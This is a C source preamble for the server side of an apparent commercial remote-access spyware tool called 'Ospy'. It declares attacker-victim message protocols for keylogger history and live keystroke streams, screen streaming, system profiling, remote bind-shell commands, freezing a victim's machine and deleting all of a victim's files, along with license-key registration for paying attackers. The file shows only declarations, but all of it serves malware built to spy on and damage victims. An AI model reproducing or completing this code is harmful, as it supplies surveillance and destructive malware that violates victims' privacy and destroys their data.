#include <stdio.h> 
#include <string.h> //strlen 
#include <stdlib.h> 
#include <errno.h> 
#include <unistd.h> //close
#include <arpa/inet.h> //close 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <sys/time.h> //FD_SET, FD_ISSET, FD_ZERO macros 
#include <time.h>
#include "md5.h"
#include "client_data_structure.h"

#define TRUE 1 
#define FALSE 0 
#define MTU 1024
#define PORT 50007
#define MAX_VICTIMS_PER_ATTACKER 10

#define ENCRYPTED_TEXT_LEN(len) (int) ((len * 1.36) + 100)
#define AES_KEY "PASS_AES_KEY" // obfuscate it !!! lol
#define HASH_LEN 34
#define MAX_BIND_SHELL_COMMAND 500
#define MAX_PASSWORD_LEN 16
#define MAX_USER_NAME_LEN 32
#define MAX_KEYSTROKE_LEN 20
#define LICENSE_KEY_LENGTH 20

struct sockaddr_in address;

typedef enum {
	LOG_IN,
	REGISTER,
	BUY_LICENSE_KEY,
	SELECT_VICTIM,
	GET_CONNECTED_VICTM,
	GET_KEYLOGGER_HISTORY, 
	GET_KEYSTROKES_STREAM,
	STOP_KEYSTROKES_STREAM,
	GET_SCREEN_STREAM,
	STOP_SCREEN_STREAM,
	GET_SYSTEM_PROFILER,
	SEND_BIND_SHELL_COMMAND,
	STUCK_VICTIMS_COMPUTER,
	DELETE_VICTIMS_ALL_FILES,
} action_type;

typedef struct {
	char victim_name[ENCRYPTED_TEXT_LEN(MAX_USER_NAME_LEN)];
	char id[HASH_LEN];
} encrypted_log_in_vicitm_protocol;

typedef struct {
	char username[MAX_USER_NAME_LEN];
	char password[MAX_PASSWORD_LEN];
} log_in_protocol;

typedef struct {
	char username[ENCRYPTED_TEXT_LEN(MAX_USER_NAME_LEN)];
	char password[ENCRYPTED_TEXT_LEN(MAX_PASSWORD_LEN)];
} encrypted_log_in_protocol;


typedef struct {
	char username[MAX_USER_NAME_LEN];
	char password[MAX_PASSWORD_LEN];
	char license_key[LICENSE_KEY_LENGTH];
} register_protocol;

typedef struct {
	char username[ENCRYPTED_TEXT_LEN(MAX_USER_NAME_LEN)];
	char password[ENCRYPTED_TEXT_LEN(MAX_PASSWORD_LEN)];
	char license_key[LICENSE_KEY_LENGTH];
} encrypted_register_protocol;


typedef struct {
	char username[MAX_USER_NAME_LEN];
	char password[MAX_PASSWORD_LEN];
} buying_license_key_protocol;

typedef struct {
	char username[ENCRYPTED_TEXT_LEN(MAX_USER_NAME_LEN)];
	char password[ENCRYPTED_TEXT_LEN(MAX_PASSWORD_LEN)];
} encrypted_buying_license_key_protocol;


typedef struct {
	char file_sub_buffer[MTU];
	int end_of_file;
} file_transformation_protocol;

typedef union{
	log_in_protocol login_to_Ospy;
	register_protocol register_to_Ospay;
	buying_license_key_protocol buy_license_key;
	char keylogger_stream_key[MAX_KEYSTROKE_LEN];
	char bind_shell_command[MAX_BIND_SHELL_COMMAND];
	char selected_victim_name[MAX_USER_NAME_LEN];
	file_transformation_protocol file_data;
} main_data;

typedef union{
	encrypted_log_in_protocol encrypted_login_to_Ospy;
	encrypted_log_in_vicitm_protocol encrypted_login_vicim_to_Ospy;
	encrypted_register_protocol encrypted_register_to_Ospay;
	encrypted_buying_license_key_protocol encrypted_buy_license_key;
	char keylogger_stream_key[ENCRYPTED_TEXT_LEN(MAX_KEYSTROKE_LEN)];
	char bind_shell_command[ENCRYPTED_TEXT_LEN(MAX_BIND_SHELL_COMMAND)];
	char selected_victim_name[ENCRYPTED_TEXT_LEN(MAX_USER_NAME_LEN)];
	file_transformation_protocol file_data;
} encrypted_main_data;

typedef struct {
	sender i_am;
	action_type action;
	encrypted_main_data data;
} encrypted_general_message_protocol;


int master_socket, addrlen, new_socket, activity, socket_descriptor;
int max_socket_descriptor; 
fd_set readfds; //set of socket descriptors

void initialize_connection();
void add_child_sockets_to_set(client_ptr * client_list);
void set_attacker_victim_connection (client_ptr * attacker, client_ptr * client_list, int num_of_connected_clients, char * selected_victim_name);
void send_to_attacker_connected_victims (client_ptr attacker, client_ptr client_list, int num_of_connected_clients);
char * encrypt_text (char * text_to_encrypt, char * encrypt_key);
char * decrypt_text (char * text_to_decrypt, char * decryption_key);